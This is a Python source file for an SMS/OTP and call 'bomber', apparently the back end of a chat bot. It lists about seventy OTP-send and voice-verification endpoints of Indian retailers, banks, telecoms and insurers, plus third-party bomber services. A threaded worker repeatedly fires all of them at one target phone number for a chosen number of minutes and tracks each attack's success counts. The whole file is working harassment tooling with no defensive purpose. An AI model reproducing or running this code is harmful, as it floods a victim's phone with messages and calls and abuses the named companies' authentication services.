"""
Jenin Bomber Engine — concurrent OTP/SMS bomber using requests + ThreadPoolExecutor.
"""
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── API list ────────────────────────────────────────────────────────────────

APIS = [
    {"name": "FreeFire Bomber",      "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET",  "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Call Bomber API",      "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Bomberr API",          "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Lenskart",             "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "Hungama",              "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
    {"name": "Meru Cab",             "url": lambda p, d: "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
    {"name": "Dayco India",          "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"api=send_otp&mob={p}"},
    {"name": "NoBroker",             "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&countryCode=IN"},
    {"name": "ShipRocket",           "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "PenPencil",            "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "1mg",                  "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "KPN Fresh",            "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "Servetel",             "url": lambda p, d: "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
    {"name": "Swiggy Call",          "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Capital",         "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "Doubtnut",             "url": lambda p, d: "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "GoPink Cabs",          "url": lambda p, d: "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"check_mobile_number=1&contact={p}"},
    {"name": "Myntra",               "url": lambda p, d: "https://www.myntra.com/gw/mobile-auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart",             "url": lambda p, d: "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Zomato",               "url": lambda p, d: "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}"},
    {"name": "Paytm",                "url": lambda p, d: "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'},
    {"name": "PhonePe",              "url": lambda p, d: "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "BigBasket",            "url": lambda p, d: "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile_number":"{p}"}}'},
    {"name": "Meesho",               "url": lambda p, d: "https://api.meesho.com/v2/auth/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Snapdeal",             "url": lambda p, d: "https://www.snapdeal.com/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Makemytrip",           "url": lambda p, d: "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "OYO",                  "url": lambda p, d: "https://api.oyoroomscrm.com/api/v2/user/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Rapido",               "url": lambda p, d: "https://rapido.bike/api/v2/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Domino's",             "url": lambda p, d: "https://order.godominos.co.in/Online/App.aspx", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"PhoneNo={p}"},
    {"name": "BookMyShow",           "url": lambda p, d: "https://in.bmscdn.com/mjson/User/SendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}"}}'},
    {"name": "Netmeds",              "url": lambda p, d: "https://www.netmeds.com/api/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Practo",               "url": lambda p, d: "https://www.practo.com/patient/loginviapassword", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Ajio",                 "url": lambda p, d: "https://www.ajio.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Nykaa",                "url": lambda p, d: "https://www.nykaa.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Croma",                "url": lambda p, d: "https://api.croma.com/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "FirstCry",             "url": lambda p, d: "https://www.firstcry.com/api/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Zepto",                "url": lambda p, d: "https://api.zepto.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Blinkit",              "url": lambda p, d: "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Mobikwik",             "url": lambda p, d: "https://www.mobikwik.com/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Freecharge",           "url": lambda p, d: "https://www.freecharge.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Airtel Thanks",        "url": lambda p, d: "https://www.airtel.in/thanks-app/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Jio",                  "url": lambda p, d: "https://www.jio.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Vodafone Idea",        "url": lambda p, d: "https://www.myvi.in/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Byju's",               "url": lambda p, d: "https://byjus.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Unacademy",            "url": lambda p, d: "https://unacademy.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Vedantu",              "url": lambda p, d: "https://www.vedantu.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Toppr",                "url": lambda p, d: "https://www.toppr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Cult.fit",             "url": lambda p, d: "https://www.cult.fit/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "HealthifyMe",          "url": lambda p, d: "https://www.healthifyme.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "PharmEasy",            "url": lambda p, d: "https://pharmeasy.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Apollo 24/7",          "url": lambda p, d: "https://www.apollo247.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "PolicyBazaar",         "url": lambda p, d: "https://www.policybazaar.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Acko",                 "url": lambda p, d: "https://www.acko.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Axis Bank",            "url": lambda p, d: "https://www.axisbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "ICICI Bank",           "url": lambda p, d: "https://www.icicibank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "HDFC Bank",            "url": lambda p, d: "https://www.hdfcbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "SBI Bank",             "url": lambda p, d: "https://www.sbi.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Kotak Bank",           "url": lambda p, d: "https://www.kotak.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Yes Bank",             "url": lambda p, d: "https://www.yesbank.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "IndusInd Bank",        "url": lambda p, d: "https://www.indusind.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "IDFC Bank",            "url": lambda p, d: "https://www.idfcfirstbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "AU Bank",              "url": lambda p, d: "https://www.aubank.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "RBL Bank",             "url": lambda p, d: "https://www.rblbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Bandhan Bank",         "url": lambda p, d: "https://www.bandhanbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Federal Bank",         "url": lambda p, d: "https://www.federalbank.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Canara Bank",          "url": lambda p, d: "https://www.canarabank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "PNB",                  "url": lambda p, d: "https://www.pnbindia.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Bank of Baroda",       "url": lambda p, d: "https://www.bankofbaroda.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Union Bank",           "url": lambda p, d: "https://www.unionbankofindia.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "LIC India",            "url": lambda p, d: "https://www.licindia.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "SBI Life",             "url": lambda p, d: "https://www.sbilife.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "HDFC Life",            "url": lambda p, d: "https://www.hdfclife.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
]

# ── State registry ───────────────────────────────────────────────────────────

active_attacks = {}
_lock = threading.Lock()


# ── Public API ───────────────────────────────────────────────────────────────

def is_bombing(chat_id):
    with _lock:
        return chat_id in active_attacks and active_attacks[chat_id].get('running', False)

def start_bombing(chat_id, phone, duration_minutes):
    with _lock:
        if chat_id in active_attacks and active_attacks[chat_id].get('running'):
            return False
        active_attacks[chat_id] = {
            'phone': phone,
            'running': True,
            'success': 0,
            'failed': 0,
            'cycles': 0,
            'start_time': time.time(),
            'duration_min': duration_minutes,
        }
    t = threading.Thread(target=_bomb_worker, args=(chat_id, phone, duration_minutes), daemon=True)
    t.start()
    return True

def stop_bombing(chat_id):
    with _lock:
        if chat_id in active_attacks:
            active_attacks[chat_id]['running'] = False
            snap = dict(active_attacks[chat_id])
            snap['elapsed'] = time.time() - snap['start_time']
            return True, snap
    return False, None

def get_stats(chat_id):
    with _lock:
        if chat_id in active_attacks and active_attacks[chat_id].get('running'):
            snap = dict(active_attacks[chat_id])
            snap['elapsed'] = time.time() - snap['start_time']
            return True, snap
    return False, None


# ── Worker ───────────────────────────────────────────────────────────────────

def _bomb_worker(chat_id, phone, duration_minutes):
    end_time = time.time() + duration_minutes * 60

    while True:
        with _lock:
            if chat_id not in active_attacks or not active_attacks[chat_id]['running']:
                break
        if time.time() >= end_time:
            with _lock:
                if chat_id in active_attacks:
                    active_attacks[chat_id]['running'] = False
            break

        with _lock:
            if chat_id in active_attacks:
                active_attacks[chat_id]['cycles'] += 1

        with ThreadPoolExecutor(max_workers=25) as ex:
            futures = {ex.submit(_send_request, api, phone, duration_minutes): api['name'] for api in APIS}
            for fut in as_completed(futures):
                with _lock:
                    if chat_id not in active_attacks or not active_attacks[chat_id]['running']:
                        break
                try:
                    ok = fut.result()
                except Exception:
                    ok = False
                with _lock:
                    if chat_id in active_attacks:
                        if ok:
                            active_attacks[chat_id]['success'] += 1
                        else:
                            active_attacks[chat_id]['failed'] += 1

        time.sleep(2)

    with _lock:
        active_attacks.pop(chat_id, None)


def _send_request(api, phone, duration):
    try:
        url = api['url'](phone, duration) if callable(api['url']) else api['url']
        headers = api.get('headers', {})
        method = api.get('method', 'GET')
        data_fn = api.get('data')
        data = data_fn(phone, duration) if callable(data_fn) else data_fn

        if method == 'POST':
            r = requests.post(url, headers=headers, data=data, timeout=8)
        else:
            r = requests.get(url, headers=headers, timeout=8)
        return r.status_code < 500
    except Exception:
        return False
